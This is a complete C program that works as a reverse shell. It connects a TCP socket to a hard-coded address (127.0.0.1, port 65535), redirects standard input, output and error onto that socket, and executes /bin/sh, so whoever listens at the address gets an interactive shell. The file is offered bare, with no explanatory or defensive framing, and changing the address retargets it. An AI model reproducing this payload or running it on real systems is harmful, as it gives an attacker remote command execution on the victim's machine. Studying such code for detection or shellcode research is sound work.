#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>

int main( int argc, char *argv[] ) {
   int serverSocketFileDescriptor;
   int clientSocketFileDescriptor; 
   int clilen;
   struct sockaddr_in serv_addr;
   struct sockaddr_in cli_addr;
   
   
   /* First call to socket() function */
   serverSocketFileDescriptor = socket(AF_INET, SOCK_STREAM, 0);
   
   /* Initialize socket structure */
   bzero((char *) &serv_addr, sizeof(serv_addr));
   
   serv_addr.sin_family = AF_INET;
   serv_addr.sin_addr.s_addr = 0x100007f;
   serv_addr.sin_port = htons(65535);
   
   
   /* Initialize a connection on a socket.*/
   clientSocketFileDescriptor = connect(serverSocketFileDescriptor, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
      

   /*Redirect to the new socket the sdtin,stdout,stderr*/
   dup2(serverSocketFileDescriptor, 0);
   dup2(serverSocketFileDescriptor, 1);
   dup2(serverSocketFileDescriptor, 2);

   /*execute /bin/sh */ 
   execve("/bin/sh", NULL, NULL);

   /* Close the sockets*/
   close(clientSocketFileDescriptor);
   close(serverSocketFileDescriptor);
}
